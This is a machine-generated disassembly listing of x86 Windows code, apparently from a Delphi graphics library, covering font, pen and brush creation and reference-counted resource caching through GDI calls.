add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_422b84
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr [ ebx ] 0x1
inc edx
add [ eax ] bl
add [ eax ] al
add al bl
sub [ edx ] eax
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
mov al 0x89
inc edx
add al ah
mov [ edx ] eax
or dl [ ecx + ecx * 2 + 0x63 ]
outsd
outsb
dec ecx
insd
popad
nop
sub [ edx + eax * 2 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x422c ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp + 0x340042 ] cl
add [ eax ] al
[ edx ] al
movsb [ edi ] [ esi ]
xor eax [ eax ]
adc al 0x8d
inc ecx
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
dec esp
mov al [ edx ]
push esp
mov [ ecx ] es
insb
pushad
inc edx
add [ edx + ecx * 4 + 0x42 ] bh
add [ ebp + ecx * 4 + 0x5ffc0041 ] ah
inc edx
add ah bl
mov al [ edx ]
mov eax 0x1c004260
mov eax [ edx ]
dec eax
mov eax [ edx ]
add [ edx + 0x42 ] ah
add [ edx ] al
inc edx
add [ ebx + ecx * 4 + 0x42 ] bl
add [ edx - 0x721fffbe ] al
inc edx
add al ch
bound eax [ edx ]
clc
lea eax [ edx ]
cld
lea eax [ edx ]
cld
bound eax [ edx ]
clc
mov [ edx ] eax
or [ edx + 0x42 ] ah
add [ eax - 0x63ffbd9e ] dl
mov [ edx ] es
adc al 0x8e
inc edx
add [ esi + ecx * 4 ] bh
inc edx
add [ eax - 0x72 ] dl
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
cwde
sub al 0x42
add [ edi ] al
add eax 0x6f634954
outsb
sub [ edx + eax * 2 ] ch
add [ ecx + ebp + 0x42 ] dh
or [ edi + 0x72 ] al
popad
jo r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
xor edi esi
inc [ ebx + ebx * 8 - 0x3974f882 ]
jne r-xdata
retn
cmp eax [ rw-data ]
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
push eax
call DeleteObject
pop esi
pop ebx
retn
call sub_403510
mov eax esi
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_422d3c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_422d78
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_422db4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_422d28
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_422d9c
xor edx edx
push ebp
push sub_422e88
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422e8f
mov eax [ ebp - 0x4 ]
call sub_422da8
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026f4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028f0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407d40
test al al
je r-xdata
sub_422e98
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_422d9c
xor ecx ecx
push ebp
push sub_422f1f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_422da8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_422f48
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422d9c
xor eax eax
push ebp
push sub_422fb1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_422db4
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_422e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422fb8
mov eax [ ebp - 0x4 ]
call sub_422da8
retn
mov eax ebx
mov si 0xfffd
call sub_403370
sub_422fc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422d9c
xor eax eax
push ebp
push sub_42301c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423023
mov eax [ ebp - 0x4 ]
call sub_422da8
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403370
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_422e98
sub_42302c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_422d9c
xor edx edx
push ebp
push sub_42308b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423092
mov eax [ ebp - 0x4 ]
call sub_422da8
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_423098
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418938
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_423135
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4182a8
mov ebx eax
mov eax ebx
call sub_4246ac
inc [ ebp - 0x4 ]
mov eax ebx
call sub_424a90
mov eax [ rw-data ]
call sub_42302c
mov eax [ rw-data ]
call sub_42302c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42313c
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_41899c
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4182a8
call sub_424968
inc esi
dec ebx
jne r-xdata
sub_42378b
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_417bcc
retn
sub_4237bc
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402c80
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402a70
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_423870
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422db4
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_4238c4
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422e98
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_423908
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418b70
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4235c8
xor eax eax
push ebp
push sub_4239c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_4235c8
xor eax eax
push ebp
push sub_4239a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422fc0
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_423a44
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4239ad
mov eax [ ebp - 0x8 ]
call sub_4235d8
retn
mov eax ebx
call sub_423cc8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_423ce4
sub_4239f4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4235c8
xor eax eax
push ebp
push sub_423a39
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422f48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423a40
mov eax [ ebp - 0x4 ]
call sub_4235d8
retn
sub_423a58
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_423be1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423be8
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403f10
retn
mov eax [ rw-data ]
call sub_422d9c
xor eax eax
push ebp
push sub_423bb9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422da8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404150
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_40864c
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_404150
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_40864c
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404150
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407e10
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_423d3c
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_423c00
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_4237bc
mov edx esp
mov eax ebx
call sub_4239f4
add esp 0x2c
pop esi
pop ebx
retn
sub_423c2c
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4239dc
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_4239f4
add esp 0x2c
pop esi
pop ebx
retn
sub_423c6c
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_4239dc
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402b80
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404188
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402a70
mov edx esp
mov eax ebx
call sub_4239f4
sub_423ce4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_423c2c
pop esi
pop ebx
retn
sub_423d10
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4239dc
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4239f4
add esp 0x30
pop ebx
retn
sub_423d44
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4239dc
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_4239f4
add esp 0x2c
pop esi
pop ebx
retn
sub_423d74
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4239dc
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_4239f4
add esp 0x2c
pop esi
pop ebx
retn
sub_423d9c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422db4
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_423de0
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422e98
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_423e08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418b70
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4235c8
xor eax eax
push ebp
push sub_423ea7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_4235c8
xor eax eax
push ebp
push sub_423e8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422fc0
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_423ff0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423e91
mov eax [ ebp - 0x8 ]
call sub_4235d8
retn
sub_423ec0
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_423ed8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4235c8
xor eax eax
push ebp
push sub_423f1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422f48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f24
mov eax [ ebp - 0x4 ]
call sub_4235d8
retn
sub_423f30
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_423ec0
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_423ed8
add esp 0x10
pop esi
pop ebx
retn
sub_423f58
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_422d9c
xor eax eax
push ebp
push sub_423fde
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422da8
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423584
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_42400c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423ec0
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_423ed8
add esp 0x10
pop esi
pop ebx
retn
sub_42403c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_423ec0
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_423ed8
sub_424068
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422db4
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_4240a8
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_422e98
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_4240d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418b70
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4235c8
xor eax eax
push ebp
push sub_424160
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_4235c8
xor eax eax
push ebp
push sub_424143
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42414a
mov eax [ ebp - 0x8 ]
call sub_4235d8
retn
sub_424178
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_424194
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4235c8
xor eax eax
push ebp
push sub_4241d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422f48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4241e0
mov eax [ ebp - 0x4 ]
call sub_4235d8
retn
sub_4241e4
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_424194
add esp 0x10
pop edi
pop esi
retn
sub_424210
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424178
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_424194
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_424244
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_422d9c
xor edx edx
push ebp
push sub_424311
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422da8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423584
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_42432c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424178
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_424194
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_424360
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403144
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_423870
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424cb8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423d9c
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424cd8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
